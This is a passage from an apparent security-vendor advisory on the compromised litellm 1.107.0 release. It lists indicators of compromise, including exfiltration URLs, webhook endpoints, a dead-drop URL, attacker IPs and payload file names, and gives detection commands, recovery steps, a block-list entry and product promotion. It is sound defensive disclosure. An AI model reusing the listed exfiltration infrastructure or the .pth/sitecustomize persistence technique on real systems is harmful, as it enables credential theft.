repository)</li><li>Attacker commit author: <code>Berri-AI &lt;ckdi82fkoos@proton.me&gt;</code></li><li>Second attacker identity: <code>letters9813@atomicmail.io</code></li><li>Attacker IPs: <code>69.48.229.143</code> (Agent Platform API, October 10), <code>199.91.221.39</code> (release workflow push and gate approval, October 21)</li><li>Post exploitation IPs using stolen AWS credentials: <code>168.100.8.57</code>, <code>165.227.201.8</code></li><li>CI secret exfiltration endpoints: <code>https://webhook.site/65a42464-3cfa-4b02-a18c-17a6d7b86f37</code>, <code>https://webhook.site/4da03473-a3e7-4dc2-a087-9c564b4208e1</code></li><li>Throwaway CI branches: <code>ci-tmp-a351cc</code>, <code>ci-tmp-be33e9</code>, <code>ci-tmp-4d8517</code>, carrying <code>.github/workflows/cache.yml</code> with the commit message &quot;ci: bump cache config&quot;</li><li>Leaked key origin: <code>opencode.json</code> committed to <code>LiteLLM-Labs/lite-harness</code> on May 27, 2026</li><li>Exfiltration URL: <code>http://www.litellm.dev/healthcheck</code> (plain HTTP POST)</li><li>Exfiltration domain: <code>litellm.dev</code> and <code>www.litellm.dev</code> (registered October 13, 2026, behind Cloudflare)</li><li>Exfiltration headers: <code>X-Token: XWiA8gZNa7NcX2XRoAEb</code>, <code>X-SHA256</code>, and <code>User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0)</code></li><li>Dead drop URL: <code>https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt</code> (account now deleted)</li><li>Dead drop GitHub account: <code>letters9813</code></li><li>Second stage path: <code>http://&lt;host&gt;/codepy</code> (any request to this path means remote code ran)</li><li>Historic dead drop values: <code>localhost:18909</code>, <code>test.test.com:18909</code></li><li>Files in site-packages: <code>cook.pth</code>, <code>cook.py</code>, <code>sitecustomize.py</code></li><li>Stealer marker: <code>/tmp/.pc_once_72129118c59f5636c0bb</code></li><li>Loader lock: <code>/tmp/remote_code_loader.lock</code> (a live holder process means the loader is running)</li><li>Temporary directories: <code>.pc_sq_*</code> and <code>.pc_e_*</code> in the system temp directory</li><li>Environment variable: <code>PRIVCOLLECT_ACTIVE=1</code></li><li>Build config: <code>data = "cook"</code> under <code>[tool.maturin]</code> in <code>pyproject.toml</code></li><li>Exfiltration RSA key SPKI SHA-256: <code>a898fd08ad220fed52488906eb45d196f332b972ad5d85214e7726545ecc4218</code></li><li>RSA public key prefix: <code>MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvxRBQMVXDXVskKS47haU</code></li></ul><h3>File hashes (SHA-256)</h3><div data-rt-embed-type='true'><table style='width:100%;border-collapse:collapse;margin:1.25em 0;font-size:0.9em'><thead><tr><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>File</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>SHA-256</th></tr></thead><tbody><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>cook.pth</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>7f191632e7320705d154b85204f1ae546b543acbd7e8861229b76f5042b92bdb</code><br>Windows: <code>84dc8c82c0a4a4a62552ef826b49fcc86d1a5c4a5d0f2c06665723f93d129d7d</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>cook.py</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>9dd0a3926f96a37eb86cf1ee2310d9be93139cc4ebef3ef9e2efe9531390be25</code><br>Windows: <code>03ac2a8b752605d1d7710979c17ff18b03dd978203ba23ba97fd8ce3d6f897ea</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>sitecustomize.py</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>34bef04fe88ac9d0aae0475630b1738681d15b94f233ac8aa46eacf5968305fa</code><br>Windows: <code>b6122440d0d9cb1eb1ade9933f49214da8c31288de7710c076c2680dfa528465</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>macosx_10_12_x86_64.whl</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>7598727f209d717041db37f7dca271d3a7d328a279890e0e1d55375729aeb86d</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>macosx_11_0_arm64.whl</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>0aaf7ba346d41ef2f40390436738b001180d5a1c03aa093f121078a9969d9a1a</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>manylinux_2_28_aarch64.whl</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>668169d35b87bf51324080390b1b1c5ab12bd335cfe5f1a99e3689abd5e02ae6</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>manylinux_2_28_x86_64.whl</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>462d0c9f67ca522d9e0e4acd245e90b36ce0d5353604a66bb7c43a1ec4a6fcf7</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>musllinux_1_2_aarch64.whl</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>c2e32d0ce2548aa662c18bf5001911a79fe5b30cf8357132275add02fdcde054</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>musllinux_1_2_x86_64.whl</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>1bbce8caa94f01c0aaa0b7ddae51553a8a32e1ce53d96d44fe583272aff7ad00</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>win_amd64.whl</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>12d4ccc5c6f8d35cf4f2cf233b7f3e418e863e657d81ff5f5fc9e210005b9484</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>litellm-1.107.0.tar.gz</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top;word-break:break-all'><code>2befe2a79fb4fbbd9a543b5b40b530c8cffa8771bab22b8fb22b2e4ae3b1f819</code></td></tr></tbody></table></div><p>Wheel file names above are shortened. Each starts with <code>litellm-1.107.0-cp310-abi3-</code>.</p><h2>Am I Affected?</h2><h3>CI/CD Pipelines</h3><p>Check your <a href="https://docs.stepsecurity.io/github-actions/harden-runner/baseline">Harden-Runner organization baseline</a> for outbound calls to <code>www.litellm.dev</code> or <code>litellm.dev</code>, and for requests to <code>raw.githubusercontent.com</code> from jobs that install LiteLLM or run the LiteLLM image. Any call to <code>litellm.dev</code> from a runner is a strong signal that the stealer ran. Because the stealer reads <code>/proc/&lt;pid&gt;/environ</code> for every process, treat every secret exposed to that job as stolen, not only the ones passed to the Python step.</p><h3>Developer Machines</h3><p>Developer laptops are a primary target. That is where browser passwords, SSH keys, cloud credentials, and AI coding tool tokens live. Look for <code>cook.pth</code> or <code>cook.py</code> in any site-packages directory, including virtual environments, and for a <code>sitecustomize.py</code> that did not come from your Python distribution. The files <code>/tmp/.pc_once_72129118c59f5636c0bb</code> and <code>/tmp/remote_code_loader.lock</code> are direct signs of infection:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>find / -name cook.pth -path "*site-packages*" 2&gt;/dev/null<br>ls -la /tmp/.pc_once_72129118c59f5636c0bb /tmp/remote_code_loader.lock 2&gt;/dev/null<br>lsof /tmp/remote_code_loader.lock 2&gt;/dev/null</code></pre></div><h3>Containers and Kubernetes</h3><p>If you run the LiteLLM proxy from the official images, check which image digest each deployment actually pulled on October 21. A deployment on <code>latest</code>, <code>main-latest</code>, or <code>main-stable</code> that pulled or restarted between 11:46 and 14:20 UTC got the infected image. Check running containers and your internal registry for the payload files and the digests listed above:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>docker images --digests | grep -E 'berriai/litellm|litellm/litellm'<br>docker exec &lt;container&gt; ls -la /app/.venv/lib/python3.13/site-packages/cook.pth<br>kubectl get pods -A -o jsonpath='{range .items[*]}{.status.containerStatuses[*].imageID}{"\n"}{end}' | grep -i litellm</code></pre></div><h3>LiteLLM Proxy and Gateway Hosts</h3><p>If <code>1.107.0</code> ran on a LiteLLM proxy host or container with <code>DATABASE_URL</code> set, assume every credential in <code>LiteLLM_CredentialsTable</code> and every API key in <code>LiteLLM_ProxyModelTable</code> was taken, along with the master key and salt key from the environment. On cloud instances, assume the instance role credentials were taken from the metadata service. BerriAI states that its private enterprise registry was not affected.</p><h3>Code Repositories</h3><p>Search your lockfiles and requirements for the bad version:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre-wrap;word-break:break-all'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>grep -rniE "litellm[=&lt;&gt;~! ]*1\.107\.0([^0-9rc]|$)" . --include=requirements*.txt --include=*.lock --include=pyproject.toml --include=Pipfile*</code></pre></div><p>Also check projects that depend on LiteLLM with an open ended constraint such as <code>litellm&gt;=1.x</code>, and Dockerfiles, Compose files, and Helm values that reference a floating LiteLLM image tag. Any install, lock refresh, or image pull between the <code>1.107.0</code> release and its removal could have resolved to the malicious version.</p><h2>Recovery Steps</h2><p>If <code>litellm 1.107.0</code> was installed from a wheel, or a container ran from an infected image, treat that host as compromised. <strong>Do not start with <code>pip install</code> or <code>pip uninstall</code>.</strong> Every Python start in the affected environment, including pip itself, runs <code>cook.pth</code> and <code>sitecustomize.py</code> again, so clean up from the shell first:</p><ol><li><strong>Kill the remote code loader.</strong> Find the process holding <code>/tmp/remote_code_loader.lock</code> with <code>lsof</code> or <code>fuser</code> and kill it. Its parent is PID 1 and its working directory is <code>/</code>.</li><li><strong>Remove the payload files from the shell.</strong> Delete <code>cook.pth</code>, <code>cook.py</code>, and <code>sitecustomize.py</code>, plus any <code>__pycache__/cook*.pyc</code> and <code>__pycache__/sitecustomize*.pyc</code>, from every affected site-packages directory. A <code>litellm-1.107.0.dist-info</code> directory confirms the bad version was installed.</li><li><strong>Rebuild rather than repair.</strong> Recreating the virtual environment or image from scratch is better than cleaning it in place. Then install a pinned clean version such as <code>pip install 'litellm==1.106.4'</code>, or one of the backports <code>1.105.5</code>, <code>1.104.7</code>, or <code>1.103.9</code>. BerriAI will skip version 1.107.0 permanently.</li><li><strong>Assume the exfiltration succeeded.</strong> If <code>1.107.0</code> ran on a host with outbound internet access, assume the stolen data was sent. A missing <code>/tmp/.pc_once_72129118c59f5636c0bb</code> marker proves nothing, because container restarts and <code>/tmp</code> cleanup remove it, and the backup copy of the stealer inside <code>sitecustomize.py</code> writes no marker at all.</li><li><strong>Redeploy containers on a pinned clean image.</strong> Replace any container built from an infected image instead of cleaning it in place. Pin <code>v1.106.4</code> by digest rather than by a floating tag, and purge cached <code>v1.107.0</code> images from internal registries and pull through caches.</li><li><strong>Update image signature checks.</strong> From <code>v1.106.3</code>, BerriAI signs its Docker images and Helm charts with a new cosign key (<code>cosign.pub</code> SHA-256 <code>e3fe3e08c44b16407fe0b37c43b4f8b603b3a0f4ee74c29e647bc022d762c2c0</code>). Verification against the previous key now fails by design, so update any <code>cosign verify</code> scripts and admission policies that pin the old key.</li><li><strong>Purge mirrors and proxies.</strong> Some PyPI mirrors kept serving cached <code>1.107.0</code> wheels after PyPI removed the release. If you run a PyPI mirror or a caching proxy, delete the <code>1.107.0</code> files by the hashes above.</li><li><strong>Rotate every credential the host could reach, from a clean machine.</strong> Cloud access keys and instance role sessions, SSH and GPG keys, saved browser passwords and session cookies, GitHub, npm, PyPI, and other registry tokens, Kubernetes and Vault tokens, CI runner secrets, and AI tool tokens for Claude, Cursor, Copilot, Gemini, Codex, and the others listed above.</li><li><strong>On LiteLLM proxy hosts,</strong> rotate every provider API key stored in the proxy database and in model <code>litellm_params</code>, plus the LiteLLM master key, salt key, and virtual keys, and the password in <code>DATABASE_URL</code>.</li><li><strong>Hunt for stolen cloud credentials.</strong> In AWS CloudTrail, look for <code>GetCallerIdentity</code> calls from the instance or task role around the install time, then for that role's credentials being used from outside your infrastructure.</li><li><strong>Block the attacker infrastructure.</strong> Block <code>litellm.dev</code> at your DNS resolver or egress firewall, and alert on requests to <code>raw.githubusercontent.com/letters9813/</code>.</li><li><strong>Audit network logs.</strong> Search for requests to <code>litellm.dev</code>, to the dead drop URL, and to any path ending in <code>/codepy</code>. A <code>/codepy</code> request means attacker supplied code ran on that host, and the incident scope is larger than this analysis.</li></ol><h2>How StepSecurity Protects Against This</h2><h3>Secret Exfiltration Attempt detection would have flagged the token theft 11 days early</h3><p>The attacker's first visible move was not the release. It was the <code>ci-tmp-*</code> workflow runs on October 10 and 12 that posted repository secrets, including the two maintainer tokens used on October 21, to <code>webhook.site</code>, and were then deleted within minutes. This is the pattern Harden-Runner's <a href='https://docs.stepsecurity.io/workspace/detections#secret-exfiltration-attempt'>Secret Exfiltration Attempt</a> detection is built for. It analyzes each workflow run as its webhook arrives, flags runs that show the indicators of an attempt to exfiltrate repository secrets, and raises the confidence to High when the run, the branch, or the workflow file is deleted shortly afterward, which is exactly what this attacker did. An alert on October 10 would have given BerriAI 11 days to revoke the stolen tokens and the leaked key before any malicious release existed.</p><p>On runners where Harden-Runner enforces an egress block policy, the POST to <code>webhook.site</code> would also have been denied at the network layer, since it is not on any normal build's allowlist, so the secrets would never have left the runner.</p><h3>Global Block List: the exfiltration domains are already blocked</h3><p>StepSecurity has added <code>litellm.dev</code> and <code>www.litellm.dev</code> to the Harden-Runner Global Block List, a curated list of indicators of compromise from real supply chain attacks. It applies to every workflow run automatically, alongside any policy you set, and it is enforced even when a workflow's egress policy is in audit mode. A CI job that installs <code>litellm 1.107.0</code> or runs the infected image cannot reach the exfiltration server.</p><h3>Harden-Runner detects and blocks the exfiltration in CI</h3><p>Harden-Runner builds a baseline of the network destinations each workflow normally contacts. A job that installs LiteLLM normally reaches <code>pypi.org</code> and <code>files.pythonhosted.org</code>. A call to <code>www.litellm.dev</code> that has never appeared in that baseline is flagged as anomalous, along with the process that made it. Detection is based on what the code does at runtime, so it works on new attacker infrastructure that is not on any list yet. In block mode, any destination outside the allowlist is denied at the network layer, so the stolen bundle never leaves the runner.</p><h3>Secure Registry stops the bad version at install time</h3><p>StepSecurity <a href='https://docs.stepsecurity.io/secure-registry'>Secure Registry</a> is a policy enforced registry that sits between your existing package managers and the public PyPI and npm registries. Once a version is confirmed compromised, as <code>litellm 1.107.0</code> is, Secure Registry blocks it from being downloaded across your organization. A developer running <code>pip install</code>, a lockfile refresh, or a CI job resolving <code>litellm&gt;=</code> gets a clean version instead of the stealer, and the block holds even if a public mirror is still serving cached copies.</p><h3>Dev Machine Guard covers developer laptops</h3><p>The payload is built for developer machines, where browser passwords, SSH keys, and AI coding tool credentials live. Dev Machine Guard's suspicious files detection watches for unexpected <code>.pth</code> files and <code>sitecustomize.py</code> files appearing in Python environments, which is exactly how this release and the March LiteLLM compromise ran their code.</p><h3>Threat Center</h3><p>StepSecurity Enterprise customers can see this incident in the Threat Center, with the full IOC set, affected versions, and remediation steps, and receive alerts through their existing SIEM, Slack, and email integrations.</p><h2>Acknowledgment</h2><p>This compromise was reported by <a href='https://github.com/LidorMachluf'>Lidor Machluf</a> of Upwind in <a href='https://github.com/BerriAI/litellm/issues/47826'>issue #47826 on the BerriAI/litellm repository</a>, including the analysis of the Docker images and the build provenance that traced the release to the <code>Berri-AI/litellm</code> lookalike repository. Thanks to Lidor for the detailed public write up, and to the BerriAI team for publishing a full attack chain report.</p><h2>References</h2><ul><li><a href='https://docs.litellm.ai/blog/security-incident-oct-21-2026-attack-chain'>LiteLLM: The attack chain behind the v1.107.0 LiteLLM release</a></li><li><a href='https://docs.litellm.ai/blog/security-incident-oct-21-2026'>LiteLLM: Contained: Oct 21, 2026 LiteLLM release v1.107.0 Compromised (official post mortem)</a></li><li><a href='https://github.com/BerriAI/litellm/issues/47826'>GitHub Issue #47826, BerriAI/litellm: litellm 1.107.0 compromised</a></li><li><a href="https://pypi.org/project/litellm/">litellm on PyPI</a></li><li><a href='https://github.com/BerriAI/litellm/releases'>LiteLLM releases on GitHub (clean releases from v1.106.3)</a></li><li><a href="https://github.com/BerriAI/litellm/commit/66c8f5b1a9cefaa7c55b758f86f4ab552f2e859e">Commit 66c8f5b1a9, originally tagged v1.107.0</a></li><li><a href='https://github.com/BerriAI/litellm/commit/20535d8fa11f786a6c24df7488a0e449ed5f09ad'>Malicious head commit 20535d8f from the lookalike repository</a></li><li><a href="https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel">StepSecurity: litellm credential stealer hidden in PyPI wheel (March 2026)</a></li><li><a href="https://docs.python.org/3/library/site.html">Python documentation: the site module, .pth files, and sitecustomize</a></li></ul><div data-rt-embed-type='true'><div style='border:1px solid rgba(52,211,153,0.35); border-left:4px solid #34d399; border-radius:14px; background:rgba(16,24,39,0.45); padding:40px 32px; margin:40px 0 0; text-align:center;'><p style='font-size:1.55em; font-weight:700; color:#f5f7fb; margin:0 0 14px;'>Check if litellm 1.107.0 is in your environment</p><p style='color:#9aa4c0; margin:0 auto 26px; max-width:620px;'>StepSecurity checks your repositories, CI/CD pipelines, and developer machines for compromised packages like litellm 1.107.0.</p><div style='display:flex; gap:14px; justify-content:center; flex-wrap:wrap;'><a href='https://www.stepsecurity.io/start-free?utm_source=blog&utm_medium=in_post_cta&utm_campaign=litellm-1-107-0&utm_content=cta_start_free' style='display:inline-block; background:#34d399; color:#0b1020; padding:14px 30px; border-radius:10px; text-decoration:none; font-weight:700;'>Start Free</a><a href='https://calendly.com/d/cs4d-nzd-72b' style='display:inline-block; background:transparent; color:#34d399; border:2px solid #34d399; padding:12px 30px; border-radius:10px; text-decoration:none; font-weight:700;'>Request a Demo</a></div></div></div></div><div class="post-rich-text-css w-embed"><!-- BLOG RICH TEXT CSS--> 
